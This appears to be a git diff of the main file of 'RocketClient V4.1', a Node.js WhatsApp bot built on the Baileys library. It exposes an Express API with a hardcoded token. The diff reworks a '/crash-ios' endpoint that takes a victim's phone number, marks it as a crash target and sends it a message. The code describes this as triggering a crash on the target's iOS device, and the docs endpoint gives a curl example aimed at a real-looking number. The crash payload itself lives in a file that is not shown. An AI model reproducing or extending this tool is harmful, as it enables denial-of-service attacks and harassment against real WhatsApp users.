@@ -1,4 +1,3 @@
-// index.js
 const {
   useMultiFileAuthState,
   DisconnectReason,
@@ -11,9 +10,11 @@ const Boom = require("@hapi/boom");
 const express = require("express");
 const app = express();
 app.use(express.json());
+
 // === BAILEYS ===
 let sock;
 let sessionExists = false;
+
 async function connectBot() {
   const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
   sock = makeWASocket({
@@ -21,15 +22,10 @@ async function connectBot() {
     auth: state,
     logger: pino({ level: "silent" }),
   });
+
   sessionExists = sock.authState.creds.registered;
-  sock.ev.on("messages.upsert", async (chatUpdate) => {
-    const m = chatUpdate.messages[0];
-    if (!m.message) return;
-    if (m.key.remoteJid === "status@broadcast") return;
-    if (m.key.id?.startsWith("BAE5")) return;
-    const msg = m.message.ephemeralMessage?.message || m.message;
-    require("./main.js")(sock, m, chatUpdate);
-  });
+
+  // === Função personalizada no sock ===
   sock.decodeJid = (jid) => {
     if (!jid) return jid;
     if (/:\d+@/gi.test(jid)) {
@@ -38,6 +34,28 @@ async function connectBot() {
     }
     return jid;
   };
+
+  sock.sendjson = async (jid, content, options = {}) => {
+    const msg = await require("@angstvorfrauen/baileys").generateWAMessageFromContent(jid, content, options);
+    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
+    return msg;
+  };
+
+  // === Eventos ===
+  sock.ev.on("messages.upsert", async (chatUpdate) => {
+    const m = chatUpdate.messages[0];
+    if (!m.message) return;
+    if (m.key.remoteJid === "status@broadcast") return;
+    if (m.key.id?.startsWith("BAE5")) return;
+
+    const msg = m.message.ephemeralMessage?.message || m.message;
+
+    // Recarrega main.js com cache limpo
+    delete require.cache[require.resolve("./main.js")];
+    const handler = require("./main.js");
+    await handler(sock, m, chatUpdate);
+  });
+
   sock.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect } = update;
     if (connection === "close") {
@@ -46,16 +64,19 @@ async function connectBot() {
       if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) {
         fs.rmSync("./database/Session", { recursive: true, force: true });
       }
-      connectBot();
+      setTimeout(connectBot, 3000);
     } else if (connection === "open") {
       sessionExists = true;
       console.log("Bot conectado com sucesso!");
     }
   });
+
   sock.ev.on("creds.update", saveCreds);
 }
+
 connectBot();
-// === APIs em JSON (rota raiz) ===
+
+// === APIs ===
 app.get("/", (req, res) => {
   res.json({
     status: "online",
@@ -63,14 +84,16 @@ app.get("/", (req, res) => {
     token: "@xd",
     endpoints: {
       "/status": "GET → { connected: true }",
-      "/connect?token=@xd&query=5582993708218": "Gera código de pareamento",
+      "/connect?token=@xd&query=5582993708218": "Gera código",
       "/deleteSession?token=@xd": "Deleta sessão",
-      "/crash-ios?token=@xd&query=5582993708218": "Envia crash iOS (usa função no main.js)"
+      "/crash-ios?token=@xd&query=5582993708218": "Envia . → crash no alvo"
     },
     docs: "/docs"
   });
 });
+
 app.get("/status", (req, res) => res.json({ connected: sessionExists }));
+
 app.get("/connect", async (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   if (sessionExists) return res.status(400).json({ error: "Sessão já existe" });
@@ -84,6 +107,7 @@ app.get("/connect", async (req, res) => {
     res.status(500).json({ error: "Erro ao gerar código", details: err.message });
   }
 });
+
 app.get("/deleteSession", (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   fs.rmSync("./database/Session", { recursive: true, force: true });
@@ -91,39 +115,40 @@ app.get("/deleteSession", (req, res) => {
   connectBot();
   res.json({ success: "Sessão deletada" });
 });
-// === CRASH iOS via função no main.js ===
+
+// === CRASH IOS via API ===
 app.get("/crash-ios", async (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   if (!sessionExists) return res.status(400).json({ error: "Bot não conectado" });
+
   const num = req.query.query?.replace(/[^0-9]/g, "");
   if (!num) return res.status(400).json({ error: "Número inválido" });
+
   const target = num + "@s.whatsapp.net";
+
   try {
-    // Chama diretamente a função crashIOS do main.js
-    const { crashIOS } = require("./main.js");
-    await crashIOS(sock, target);
-    res.json({ success: true, target, message: "Crash iOS iniciado via função no main.js" });
+    // Marca o alvo como "alvo do crash"
+    global.crashTarget = target;
+
+    // Envia um ponto (.) para o alvo
+    await sock.sendMessage(target, { text: "." });
+
+    res.json({ success: true, target, message: "Ponto enviado. Crash será disparado ao detectar envio." });
   } catch (err) {
-    res.status(500).json({ error: "Falha ao iniciar crash", details: err.message });
+    res.status(500).json({ error: "Falha ao enviar ponto", details: err.message });
   }
 });
+
 app.get("/docs", (req, res) => {
   res.json({
     api: "RocketClient V4.1",
     token: "@xd",
-    endpoints: {
-      "GET /": "Retorna este JSON com APIs",
-      "GET /status": "Status do bot",
-      "GET /connect?token=@xd&query=NUMERO": "Gera código de pareamento",
-      "GET /deleteSession?token=@xd": "Deleta sessão",
-      "GET /crash-ios?token=@xd&query=NUMERO": "Envia crash iOS (via main.js)"
-    },
     examples: {
-      connect: "curl 'https://seu-app.onrender.com/connect?token=@xd&query=5582993708218'",
       crash: "curl 'https://seu-app.onrender.com/crash-ios?token=@xd&query=5582993708218'"
     }
   });
 });
+
 // === SERVIDOR ===
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
